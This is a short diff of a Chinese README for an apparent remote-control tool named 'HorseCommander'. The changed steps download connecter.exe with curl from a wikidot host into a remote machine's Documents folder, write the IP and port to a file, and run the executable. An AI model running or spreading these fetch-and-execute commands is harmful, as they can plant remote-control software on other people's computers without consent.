@@ -44,6 +44,7 @@ msg [消息]
 本地
 ```cmd
 curl "https://helloosdisk.wdfiles.com/local--files/file:software/HorseCommander.exe" --output ./connecter.exe
+echo [端口]>>connect.txt
 ipconfig
 ```
 远程
@@ -51,6 +52,7 @@ ipconfig
 cd %%temp%%/../../../Documents
 curl "https://helloosdisk.wdfiles.com/local--files/file:software/connecter.exe" --output ./connecter.exe
 echo [你的内网IP]>>connect.txt
+echo [端口]>>connect.txt
 ./connecter.exe
 ```
 ## 下载
